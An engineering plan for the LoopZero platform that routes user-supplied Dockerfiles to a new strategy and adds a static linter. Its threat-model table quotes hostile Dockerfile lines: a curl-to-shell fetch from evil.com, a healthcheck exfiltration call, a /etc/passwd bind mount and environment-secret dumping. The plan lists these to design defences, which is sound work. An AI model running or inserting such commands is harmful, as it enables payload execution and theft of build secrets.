# Plan: Build Mode Dispatch + User Dockerfile Security

> **Version 1.0** — Eliminar a invocação incondicional de `loopzero-packs` na orquestração de build, restaurando o eixo `build: dockerfile` como dispatch de primeira-classe via Strategy pattern. Em paralelo, blindar o pipeline contra Dockerfiles maliciosos do usuário com static linter pre-build, threat-modeled rejection rules, e canonical loopzero-packs runner com behavior lenient (defense in depth). Fecha a regressão F-23 (loopzero-packs v0.3.x stale image errors on user Dockerfile) e a divida arquitetural MEET-2026-03-29-017 (universalização de loopzero-packs ignorou o eixo `Build`).

## Context

### O que existe hoje (estado pré-plano)

- **`api/internal/services/build_plan.go`** já trata `unit.Build == "dockerfile"` corretamente: `DockerfilePath` resolve para `/workspace/<app.Path>/Dockerfile` e `ContextPath` para `/workspace/<app.Path>`. **O build-image (BuildKit) está OK.**
- **`api/internal/argo/workflow_builder.go:143`** chama `loopzeroPacksDockerfileStep(g.Apps, ...)` **incondicionalmente** para todo grupo de linguagem, ignorando `app.Build`. Isso desperdiça ~30s por app por build E cria dependência implícita do loopzero-packs ser lenient.
- **`api/internal/argo/languages.go`** — `LanguageStrategy` interface com 4 métodos (Validate/Install/Build/Scan); `DockerfileStep` foi REMOVIDO em MEET-2026-03-29-017 quando loopzero-packs virou universal. `ResolveStrategy(framework string)` despacha apenas por linguagem; ignora `app.Build`.
- **`/home/paulo/loopzero-packs/cmd/loopzeropacks-generate/main.go:60-73`** — source ATUAL é lenient: detecta user Dockerfile, copia para `--output`, sai com 0. **Source correto.**
- **k3d build-cluster image** — pulled de `k3d-loopzero-registry:5000/loopzero-packs-runner:latest` cujo digest é stale (pre-fix). Erra em "[loopzeropacks] ERROR: user-supplied Dockerfile found".
- **Zero static analysis** sobre Dockerfiles fornecidos pelo usuário antes de BuildKit consumir.
- **Zero allow-list** sobre `FROM` base images.

### Evidência

- F-23 caught LIVE durante cleanroom Dogfood Gate (2026-05-07): loopzero-packs v0.3.x stale image rejeita todas as fixtures do e2e suite (todas declaram `build: dockerfile`).
- `build_plan.go:111` — campo `DockerfilePath` populado corretamente.
- `workflow_builder.go:143` — `loopzeroPacksDockerfileStep` invocado sem branching.
- `loopzero-packs/main.go:62` — comportamento lenient já no source.
- `loopzero-packs/CHANGELOG.md` — não documenta versão lenient como contrato canônico.
- Comparáveis: Vercel/Heroku/CloudRun aceitam Dockerfile do usuário com linter (hadolint-style) ou docs de constructs proibidos.

## Objective

**Done =** API skipa loopzero-packs por design quando `app.Build == "dockerfile"` via Strategy dispatch (zero `if` na orquestração); user-supplied Dockerfiles passam por static linter antes de BuildKit; loopzero-packs v0.4.0 documenta lenient behavior como contrato canônico; cleanroom dogfood reproduzível ponta-a-ponta sem patches operacionais.

Metas mensuráveis:

1. `LanguageStrategy.DockerfileStep` restaurado ao interface; cada strategy retorna seu container apropriado
2. `ResolveStrategyForApp(AppSpec) LanguageStrategy` despacha para `UserDockerfileStrategy` quando `app.Build == "dockerfile"`
3. `UserDockerfileStrategy.DockerfileStep` retorna container `dockerfile-lint` que valida user Dockerfile contra rejection rules (sem invocar loopzero-packs)
4. `loopzero-packs` source bump para v0.4.0 + CHANGELOG entry + unit test pinning lenient behavior + image push ao registry
5. Cleanroom bootstrap recompila loopzero-packs do source local quando disponível (ou pina tag explícita) para evitar registry hygiene drift
6. Zero workarounds operacionais (`kubectl set env`, manual tag push) necessários para cleanroom verde
7. E2E test: deploy com user Dockerfile passando os linter rules → build verde + Rollout deployed; deploy com Dockerfile malicioso → workflow falha em `dockerfile-lint` step com mensagem clara

## Threat Model — User-Supplied Dockerfile

### Trust boundary

| Actor | Permissions | Threat to platform |
|-------|-------------|-------------------|
| Tenant developer | Push code to their tenant; `loopzero deploy` | LOW — LoopZero's runtime sandbox (PSA restricted, drop ALL caps, NetworkPolicy default-deny, runAsNonRoot, ResourceQuota) já isola código do tenant em runtime. Equivalente a tenant rodando código arbitrário em seu pod — risk is to themselves. |
| Tenant pod at runtime | Limitado por PSA + NetworkPolicy + RBAC | Mitigado por isolamento existente. |
| Build-time Dockerfile | Roda em BuildKit rootless no build cluster | **Aqui mora o risk não totalmente coberto** — BuildKit é sandbox forte mas user Dockerfile pode tentar exfil, abuse de recursos do build cluster, supply-chain via base images. |

### Vectors enumeradas + controls

| # | Vector | Risk | Existing control | New control (this plan) |
|---|--------|------|------------------|------------------------|
| V1 | `FROM evil-registry.com/...` ou typosquatting (`nodejs:20` em vez de `node:20`) | Supply chain compromise | None | **Allow-list `FROM` registries:** docker.io/library/*, docker.io/<owner>/<name>, ghcr.io/*, registry.digitalocean.com/*, k3d-loopzero-registry:5000/*. Outros → REJECT (linter exit 1). Pode ser opt-in expandido via `loopzero.yaml` `build.allowed_registries: [...]` com flag de tenant + audit log. |
| V2 | `RUN curl evil.com \| sh` durante build (fetch malicious payload) | Code execution at build time, supply chain | BuildKit egress restricted (`network=none` opt-in possível) | **Default `--network=none` em buildctl** quando `build: dockerfile`. Tenant pode opt-in network via `loopzero.yaml` `build.network: enabled` (audit logged). |
| V3 | `--mount=type=bind,src=/etc/passwd,dst=/leak` ou similar | Build context escape | BuildKit rootless mitiga parcialmente | **Linter rejeita `--mount=type=bind` com src absoluto** ou src fora de `${context}`. Aceita apenas `--mount=type=cache` e `--mount=type=secret` (com nome em allow-list). |
| V4 | `USER root` ou `USER 0` em runtime stage | Privilege escalation no pod | PSA restricted enforces non-root via `runAsNonRoot: true` em `pod.spec.securityContext` (admission controller bloqueia) | **Linter warning early** quando final stage tem `USER 0/root`. Não bloqueia (PSA enforça em runtime), mas avisa o user explicitamente que pod vai falhar a startar. |
| V5 | `RUN dd if=/dev/zero of=/big.bin bs=1M count=10000` (DoS build cluster disk) | Resource exhaustion | Argo Workflow `resources.limits` (CPU/memory) | **Add ephemeral-storage limit** ao buildkit container template (e.g., 10Gi). |
| V6 | `RUN env > /shared/leaked-env` exfiltrando build secrets | Secret exfiltration | Build secrets injetados via `--mount=type=secret` (não em ENV) | **Auditoria:** build pipeline NÃO injeta tenant secrets como ENV vars no buildkit container. (verify + add regression test) |
| V7 | `--privileged` ou capabilities adds | Container escape | BuildKit já é rootless; `--privileged` requer host privileges não disponíveis | **Linter rejeita** `--security=insecure` em RUN steps. |
| V8 | Multi-stage final image inclui não-determinístico/malicioso (image referenced por digest válido mas conteúdo malicioso) | Hard to detect via static analysis | cosign sign + admission policy verifica signature em runtime | **SBOM (syft) já gerado.** Add: trivy/grype scan post-build com fail-on=CRITICAL. (Já planejado em Sprint 6 mas não shipped no scope dockerfile.) |
| V9 | `HEALTHCHECK CMD curl evil.com` exfiltrando após deploy | Runtime exfiltration | NetworkPolicy default-deny no tenant namespace | **Already covered** — NetworkPolicy bloqueia egress para fora de allow-list. |
| V10 | Cosign signs malicious user image, dando aparência de "trusted by LoopZero" | Trust attack | Signature attestation include build provenance (tenant + commit + workflow ID); admission policy checks WHO signed, not WHAT was signed | **Document explicitly** que cosign signature attesta "LoopZero built this for tenant X from commit Y" — NÃO atesta safety do conteúdo. Same posture as Vercel/Heroku: build provenance ≠ content trust. |

### Hard rejection rules (linter exits 1)

```
1. FROM <registry> not in allow-list
2. --security=insecure flag em qualquer RUN
3. --mount=type=bind,src=<absolute or escapes context>
4. --privileged in any form
5. SECCOMP=unconfined or AppArmor=unconfined
6. ARG/ENV containing keys reserved by LoopZero (LOOPZERO_*, KUBERNETES_*, AWS_*, DO_*)
```

### Soft warnings (linter logs, build proceeds)

```
1. USER 0 / USER root in final stage (PSA restricted will reject pod)
2. EXPOSE without port mapping in loopzero.yaml (port mismatch likely)
3. HEALTHCHECK without CMD (kubelet probe will be used instead — OK but worth noting)
4. ADD <url> instead of COPY (less reproducible; allow with warning)
5. apt-get install without --no-install-recommends (image bloat)
```

### Out of scope (explicitly NOT addressed by this plan)

- Runtime container escape (covered by PSA + admission policy + Sprint 6 supply chain)
- Tenant code exfiltrating tenant's own data (tenant can do this anyway via app code)
- DoS attacks on LoopZero control plane (covered by rate limits + plan enforcement)
- Cross-tenant attacks (covered by namespace isolation + cell architecture)

## ADRs

### D1 — Strategy dispatch é o eixo de decisão (não `if` na orquestração)

**Decision:** Restaurar `DockerfileStep` ao `LanguageStrategy` interface. Cada strategy decide se invoca loopzero-packs ou retorna container alternativo (lint ou no-op).

**Rationale:** O codebase já tem Strategy pattern para Validate/Install/Build/Scan. Adicionar um `if` no orchestrator vazaria decisão de estratégia para a camada errada. Restaurar `DockerfileStep` re-aplica simetria — toda decisão "qual container roda nesta fase" vira responsabilidade de quem implementa Strategy. Reverte parcialmente MEET-2026-03-29-017 (que universalizou loopzero-packs assumindo eixo único de dispatch — eixo errado, era linguagem-only enquanto deveria ser linguagem × build-mode).

**Consequences:** Adiciona 1 método ao interface (breaking change interno; `WorkflowBuilder` precisa atualizar call site). Nova `UserDockerfileStrategy` (não confundir com `CustomStrategy` cujo significado é `framework: custom`). Strategy resolver sai de `(string) → Strategy` para `(AppSpec) → Strategy`.

### D2 — `UserDockerfileStrategy` é a estratégia para `build: dockerfile`, não `CustomStrategy`

**Decision:** Criar nova `UserDockerfileStrategy` com semântica explícita "user supplies Dockerfile". `CustomStrategy` mantém significado original (`framework: custom`, sem build/install pipeline gerenciado por LoopZero).

**Rationale:** Sobrecarregar `CustomStrategy` com dois significados (custom framework + user dockerfile) cria confusão. As semânticas são diferentes:
- `CustomStrategy`: user gerencia build E execução; LoopZero só observa
- `UserDockerfileStrategy`: user fornece o "como empacotar" (Dockerfile), LoopZero gerencia validação + execução

**Consequences:** +1 strategy file (`user_dockerfile_strategy.go`), +1 entry no resolver. Custom + UserDockerfile podem coexistir via composition (custom framework + user dockerfile = both true).

### D3 — Linter de Dockerfile é parte do build pipeline (não opcional)

**Decision:** Adicionar step `dockerfile-lint` ao Argo Workflow para apps com `build: dockerfile`. Step roda BEFORE `build-image` (BuildKit). Falha do linter = workflow Failed, sem build.

**Rationale:** Linter no momento do build é o ponto certo:
- Tenant tem feedback rápido (workflow log mostra rejection com line number + rule)
- Defense in depth: BuildKit já tem sandboxing, linter add early-rejection layer
- Auditável: linter output é capturado por Loki + workflow status

Alternativas consideradas:
- Linter no CLI antes de upload — REJEITADO: client-side é bypass-able; servidor MUST verify
- Linter na API antes de submit workflow — CONSIDERADO mas linter precisa do source code clonado, que só está disponível dentro do workflow após `clone-repo`
- Linter como admission webhook em runtime — REJEITADO: tarde demais; image já push'ed ao registry

**Consequences:** +1 container template em workflow_builder; +1 binary `loopzero-dockerfile-lint` (Go). Breakage potencial para users com Dockerfiles que estavam passando antes de allow-list de registries — mitigado por release notes + grace period (warn-only mode primeiro release, reject-mode depois de 1 sprint).

### D4 — loopzero-packs source é canonical lenient; image rebuild é parte do bootstrap

**Decision:** loopzero-packs v0.4.0 declara explicitamente em CHANGELOG que comportamento lenient (skip-and-copy on user Dockerfile) é o contrato canônico. Build pipeline da LoopZero recompila loopzero-packs do source local em cleanroom mode (ou pina tag explícita publicada).

**Rationale:** O source de loopzero-packs já está correto. O bug é registry hygiene — image stale. Garantir que cleanroom NUNCA caia em image stale requer um de:
- (a) Recompilar loopzero-packs do source no `task setup` quando `/home/paulo/loopzero-packs` está disponível
- (b) Pinar `imageLoopZeroPacks` em `constants.go` em uma tag específica versionada (ex: `:v0.4.0`) que CI publica em DOCR + k3d-registry sync

Escolhemos (b) porque (a) acopla cleanroom à existência do source local (operadores diferentes). v0.4.0 é a primeira versão com lenient behavior documentado como contrato.

**Consequences:** Bump `loopzero-packs` para v0.4.0 (CHANGELOG + tag); CI workflow `build-runner.yml` push image as `:v0.4.0` + `:latest`; `api/internal/argo/constants.go` `imageLoopZeroPacks = "...:v0.4.0"` (não `:v0.2.0`); `infra/tilt/api-deployment.yaml` LOOPZERO_PACKS_IMAGE override em standalone aponta para `:v0.4.0` no k3d-registry; bootstrap script `task k3d:bootstrap-build` puxa da DOCR ou rebuild local.

### D5 — Defense in depth: API skipa loopzero-packs E loopzero-packs lida graciosamente

**Decision:** Manter ambos os layers corretos:
1. API: `UserDockerfileStrategy.DockerfileStep` retorna `dockerfile-lint` (não invoca loopzero-packs)
2. loopzero-packs: continua lenient (copy + exit 0) caso seja invocado por path legacy ou bug

**Rationale:** Defense in depth. Se API tem bug e ainda invoca loopzero-packs num app `build: dockerfile`, o sistema continua funcional. Se loopzero-packs regredir (futuro v0.5.x volta a strict), a API path correto não é afetada.

**Consequences:** Duplicação aparente. Aceitamos — segurança em camadas é o trade-off correto.

## Phases & Tasks

### Phase 0 — loopzero-packs canonical version (cross-repo)

#### T0.1 — loopzero-packs unit test pin lenient behavior (`/home/paulo/loopzero-packs/`)

**File:** `cmd/loopzeropacks-generate/main_test.go`
**Action:** Garantir que existe teste explícito que assertae:
- Workspace com `Dockerfile` (user) + `package.json`
- `loopzeropacks-generate` exits 0
- `--output` file contém EXATAMENTE o conteúdo do user Dockerfile (não conteúdo gerado)
- stderr contém `User-provided Dockerfile found ... skipping generation`

**DoD:** Test passa em isolation; CI workflow `ci.yml` runs it on every PR.

#### T0.2 — loopzero-packs CHANGELOG bump v0.4.0

**File:** `/home/paulo/loopzero-packs/CHANGELOG.md`
**Action:** Adicionar entry sob `## [0.4.0] - 2026-05-07`:
- `Added`: User-provided Dockerfile precedence as canonical contract — when present at `<app-dir>/Dockerfile`, loopzeropacks-generate copies it to --output verbatim and exits 0 with diagnostic message. Closes the implicit-strict regression of v0.3.x.
- `Added`: Unit test `TestUserProvidedDockerfilePrecedence` pinning the lenient behavior.

**DoD:** CHANGELOG atualizado; `git tag v0.4.0` aplicado ao commit do source.

#### T0.3 — loopzero-packs CI publish v0.4.0

**File:** `/home/paulo/loopzero-packs/.github/workflows/build-runner.yml`
**Action:** Verificar workflow gera imagem com tag `v0.4.0` + `:latest`. Push para DO Registry + (em PR) gerar artifact tarball baixável para k3d cleanroom.

**DoD:** Tag `v0.4.0` em DO Registry: `registry.digitalocean.com/loopzero-system/loopzero-packs-runner:v0.4.0` resolves.

### Phase 1 — Strategy refactor (this repo)

#### T1.1 — Restaurar `DockerfileStep` no interface

**File:** `api/internal/argo/languages.go`
**Action:** Adicionar `DockerfileStep([]services.AppSpec, int) *forge.Container` ao `LanguageStrategy` interface (segundo arg = totalApps for path resolution).

**Tests:** Todas as concrete strategies (NodeStrategy/GoStrategy/PythonStrategy/etc) precisam implementar. Testes existentes continuam passando.

**DoD:** `go build ./api/...` green; existing strategy tests green.

#### T1.2 — Concrete strategies retornam loopzeroPacks (default behavior preserved)

**Files:** `languages.go` para cada strategy não-Custom
**Action:** `func (s *NodeStrategy) DockerfileStep(apps, total) *forge.Container { return loopzeroPacksDockerfileStep(apps, total) }` (e idem para Go/Python/etc).

**DoD:** Workflow gerado sem `build: dockerfile` é byte-identical ao pre-refactor (regression test em `workflow_builder_test.go`).

#### T1.3 — Nova `UserDockerfileStrategy`

**File:** `api/internal/argo/user_dockerfile_strategy.go` (novo)
**Action:** Implementar com:
- `Name() = "user-dockerfile"`
- `ValidateStep` — no-op (workspace validation já feito por outras strategies se framework foi declarado)
- `InstallStep` — no-op
- `BuildStep` — no-op (build acontece dentro do user Dockerfile)
- `ScanStep` — no-op
- `DockerfileStep` — retorna `dockerfileLintStep(apps)` (T2.1 abaixo)

**Tests:** `user_dockerfile_strategy_test.go` cobrindo cada método.

**DoD:** Strategy tipa em LanguageStrategy interface; tests green.

#### T1.4 — `ResolveStrategyForApp(AppSpec) LanguageStrategy`

**File:** `api/internal/argo/languages.go`
**Action:** Nova função:
```go
func ResolveStrategyForApp(app services.AppSpec) LanguageStrategy {
    if app.Build == "dockerfile" {
        return &UserDockerfileStrategy{}
    }
    return ResolveStrategy(app.Framework)
}
```
Manter `ResolveStrategy(string)` para backwards-compat (chamado em `groupApps` extractor que só vê framework name como group key).

**Tests:** `TestResolveStrategyForApp` cobrindo: `build: dockerfile` → UserDockerfileStrategy; `build: ""` + framework=node → NodeStrategy; `framework: custom` + build="" → CustomStrategy; etc.

**DoD:** Tests green; backwards-compat preservado.

#### T1.5 — `groupApps` agrupa por strategy correto

**File:** `api/internal/argo/workflow_builder.go`
**Action:** Atualizar extractor functions em `groupApps` para usar `ResolveStrategyForApp` ao mapear AppSpec → group key. Apps com `build: dockerfile` viram seu próprio grupo "user-dockerfile".

**Tests:** `TestWorkflowBuilder_BuildModeDispatch` — spec com 1 app `build: dockerfile` + 1 app `framework: node` → 2 groups.

**DoD:** Tests green; workflow gerado tem 2 grupos de templates corretos.

#### T1.6 — Workflow builder chama `g.Strategy.DockerfileStep(...)` (sem `if`)

**File:** `api/internal/argo/workflow_builder.go`
**Action:** Trocar:
```go
withSuffix(loopzeroPacksDockerfileStep(g.Apps, len(spec.Apps)), g.Suffix),
```
Por:
```go
withSuffix(g.Strategy.DockerfileStep(g.Apps, len(spec.Apps)), g.Suffix),
```

**Tests:** `TestWorkflowBuilder_NoConditional_OnlyDispatch` — verifica que builder não tem branching condicional sobre app fields no Dockerfile step layer.

**DoD:** Tests green; `if` zerado nesta camada.

### Phase 2 — Dockerfile linter (this repo)

#### T2.1 — `dockerfile-lint` container template

**File:** `api/internal/argo/dockerfile_lint.go` (novo)
**Action:** Função `dockerfileLintStep(apps []AppSpec) *forge.Container` retorna container que:
- Image: `loopzero-dockerfile-lint:v0.1.0` (T2.2)
- Args: `--source /workspace --apps <comma-separated-paths>`
- Resources: small (50m CPU / 64Mi memory) — análise estática rápida

**Tests:** `TestDockerfileLintStep_Container` valida shape + image ref.

**DoD:** Test green.

#### T2.2 — `loopzero-dockerfile-lint` binary (novo subdir)

**File:** `tools/loopzero-dockerfile-lint/main.go` (novo) — Go static analyzer.
**Action:** Implementar parser simples para Dockerfile syntax + rules engine. Suportar:
- Hard rejection (D3 rules above) → exit 1
- Soft warning → log, exit 0
- Output formato structured (`{rule, severity, line, msg}`) para Loki + audit
- Read `loopzero.yaml` para `build.allowed_registries` opt-in extensions

**Tests:** `tools/loopzero-dockerfile-lint/main_test.go` com 20+ casos cobrindo cada rejection + warning.

**DoD:** `go test ./tools/loopzero-dockerfile-lint/...` green; binary builds.

#### T2.3 — `loopzero-dockerfile-lint` Dockerfile + image build

**File:** `tools/loopzero-dockerfile-lint/Dockerfile` (novo)
**Action:** Multi-stage Go build → minimal alpine image. CI workflow publica em DOCR + k3d-registry para cleanroom.

**DoD:** Image push'ed; smoke test (`docker run ... --help`) green.

#### T2.4 — Wire lint step ao workflow

**File:** já feito em T1.6 (UserDockerfileStrategy.DockerfileStep returns dockerfileLintStep).
**Action:** Verificar end-to-end via integration test em `workflow_builder_test.go`: spec com `build: dockerfile` → workflow contém `dockerfile-lint` step antes de `build-image`.

**DoD:** Integration test green.

### Phase 3 — loopzero-packs image pin + bootstrap

#### T3.1 — Pin `imageLoopZeroPacks` para v0.4.0

**File:** `api/internal/argo/constants.go`
**Action:** `imageLoopZeroPacks = "registry.digitalocean.com/loopzero-system/loopzero-packs-runner:v0.4.0"`.

**DoD:** const updated; workflow_builder_test asserts image ref.

#### T3.2 — Tilt YAML aponta para v0.4.0 no k3d-registry

**File:** `infra/tilt/api-deployment.yaml`
**Action:** `LOOPZERO_PACKS_IMAGE = k3d-loopzero-registry:5000/loopzero-packs-runner:v0.4.0`.

**DoD:** YAML updated.

#### T3.3 — Bootstrap pull/push v0.4.0 ao k3d-registry

**File:** `infra/scripts/k3d-cross-cluster-heal.sh` (add new H step) ou `task setup`
**Action:** Após cluster create, pull `registry.digitalocean.com/loopzero-system/loopzero-packs-runner:v0.4.0` (auth via DOCR creds quando disponíveis; build local from `/home/paulo/loopzero-packs` quando não), tag e push como `k3d-loopzero-registry:5000/loopzero-packs-runner:v0.4.0` + `:latest`.

**DoD:** Cleanroom destroy/setup → `:v0.4.0` available no k3d-registry sem manual intervention.

### Phase 4 — Tests + Dogfood Gate

#### T4.1 — Unit tests cobrindo strategy dispatch

**Files:** `workflow_builder_test.go`, `languages_test.go`, `user_dockerfile_strategy_test.go`
**Action:** Tests que validam:
- `build: dockerfile` app → UserDockerfileStrategy → workflow contains `dockerfile-lint`, NOT `generate-dockerfile` (loopzero-packs)
- `build: ""` + framework=node → NodeStrategy → workflow contains `generate-dockerfile`
- Mixed monorepo (1 dockerfile + 1 node) → 2 groups, each with correct steps
- Backward compat: existing test outputs unchanged for non-dockerfile apps

**DoD:** All tests green; coverage on strategy dispatch ≥ 95%.

#### T4.2 — Linter unit tests (T2.2)

Already covered in T2.2 — 20+ cases.

#### T4.3 — E2E LIVE: deploy with user Dockerfile (lenient happy path)

**File:** `infra/tests/e2e/journey_user_dockerfile_test.go` (novo)
**Action:** Ginkgo spec deploy fixture com `build: dockerfile` + Dockerfile válido → expect:
- Workflow contains `dockerfile-lint` step (Succeeded)
- Workflow does NOT contain `generate-dockerfile` step
- Build succeeds
- Pod Running 1/1
- HTTP 200 from Traefik

**DoD:** Spec passes LIVE in cleanroom; documented in `docs/learnings/`.

#### T4.4 — E2E LIVE: deploy with malicious Dockerfile (rejection path)

**File:** `infra/tests/e2e/fixtures/malicious-dockerfile/` (novo) — fixture com `FROM evil-registry.example.com/x:latest`.
**File:** `infra/tests/e2e/journey_user_dockerfile_test.go` (extend)
**Action:** Spec deploy malicious fixture → expect:
- Workflow `dockerfile-lint` step Failed
- Subsequent `build-image` Omitted
- API releases marked SYNC_FAILED with reason
- CLI exit 2 (build failure)

**DoD:** Spec passes LIVE; rejection rules audit-logged.

#### T4.5 — Cleanroom Dogfood Gate post-this-plan

**Action:** `task clean:all && task setup && tilt up && task doctor` + `bash infra/scripts/dogfood-cleanroom-loop.sh` → expect:
- Phase 6 dogfood journeys: ALL 12 PASS sem manual intervention
- Phase 7 post-validation: zero S0/S1
- Zero `kubectl set env` ou registry tag manipulation manual no caminho

**DoD:** Cleanroom log + state.json archived em `docs/reports/`.

## Acceptance Criteria

- [ ] loopzero-packs source v0.4.0 tagged + image em DOCR + k3d-registry
- [ ] `LanguageStrategy.DockerfileStep` restaurado; todas strategies implementam
- [ ] `UserDockerfileStrategy` existe e despachada via `ResolveStrategyForApp`
- [ ] `workflow_builder.go` SEM `if` condicional sobre `app.Build` na composição de templates
- [ ] `loopzero-dockerfile-lint` binary + image em DOCR + k3d-registry
- [ ] All linter rejection rules cobertas por unit tests
- [ ] `imageLoopZeroPacks` const = `:v0.4.0` (não `:v0.2.0`)
- [ ] Bootstrap (`task setup` ou heal) garante v0.4.0 disponível no k3d-registry após cleanroom destroy
- [ ] E2E live: user Dockerfile happy path PASS
- [ ] E2E live: malicious Dockerfile rejection PASS
- [ ] Cleanroom Dogfood Gate 12/12 PASS sem patches manuais
- [ ] Backwards-compat: workflows para apps sem `build: dockerfile` byte-identical pre/post

## Global Definition of Done

- [ ] All phases (0-4) completed
- [ ] All Go tests passing (unit + e2e)
- [ ] All loopzero-packs tests passing (cross-repo)
- [ ] Zero golangci-lint warnings
- [ ] `task validate:manifests` passa
- [ ] `kubeconform --strict` passa em qualquer manifest novo
- [ ] CLI Rule 3: zero internal terms em mensagens de linter rejection (use "Dockerfile validation" not "BuildKit lint")
- [ ] `/cross-validation build-mode-dispatch-and-dockerfile-security` PASSED — zero S0, zero S1
- [ ] `/dogfood full` PASSED em fresh cleanroom

## Dogfood Gate (MANDATORY — NON-NEGOTIABLE)

> No plan is DONE without `/dogfood full` passing on clean infrastructure.

```bash
# 1. Fresh infra
task teardown && task setup && tilt up
task doctor

# 2. Run /dogfood full
/dogfood full

# 3. Run new e2e specs
JWT=$(cat ~/.loopzero/local-dogfood-token.txt) LOOPZERO_E2E=1 \
  go run github.com/onsi/ginkgo/v2/ginkgo -v \
    --label-filter="user-dockerfile" --timeout=30m ./infra/tests/e2e/
```

### Pass criteria

- [ ] `/dogfood full` 12/12 PASS sem patches operacionais
- [ ] User-dockerfile happy + rejection specs PASS
- [ ] Zero loopzero-packs strict-mode errors em workflow logs
- [ ] Zero `kubectl set env` ou registry tag manipulation manual
- [ ] Linter rejection rules audit-loggadas para análise

### On failure

S0 ou S1 finds → fix in source → re-run on fresh cleanroom → repeat until zero S0/S1.

## Governance Note

Este plano é **T2** (architecture: novo strategy interface method, novo binário security tool, cross-repo coordination, mudanças no Argo Workflow template, novo behavior em cleanroom bootstrap). Per pre-release governance, requer T2 meeting com:
- Production Design Reviewer
- Security & Blast Radius Reviewer (foco no threat model + linter rules)
- Change Validation Planner
- Pipeline Reviewer (Helena Duarte)

ADR-mandatory para D1, D3, D4 (interface change + new pipeline step + cross-repo version pin).

**Submit via:** `/meeting build-mode-dispatch-and-dockerfile-security`.

## Out-of-Scope (Explicit)

- Runtime image scanning (covered separately in Sprint 6 / supply chain)
- Cosign keyless verification with Fulcio (covered separately, pending Sprint 9)
- Linter as CLI command (`loopzero lint Dockerfile`) — could be added later as DX improvement; not required for security model
- Migrating existing apps from loopzero-packs auto-generation to user Dockerfile — opt-in via tenant action, no forced migration
- BuildKit network=none enforcement — listed in V2 mitigation but full implementation requires changes in `buildkit.go` template; if not in this plan's scope, opens follow-up plan

## References

- `docs/plans/argo-rollouts-progressive-delivery-plan.md` — same governance pattern + cleanroom dogfood discipline
- `MEET-2026-03-29-017` — original decision to universalize loopzero-packs (this plan revises)
- `feedback_no_tribal_knowledge` (memory) — every manual workaround → committed script + matrix entry
- `feedback_production_parity` (memory) — environment always mirrors production (no dev-only bypass)
- F-23 case study — workaround memo `kubectl set env loopzero-api LOOPZERO_PACKS_IMAGE=...:lenient` as anti-pattern
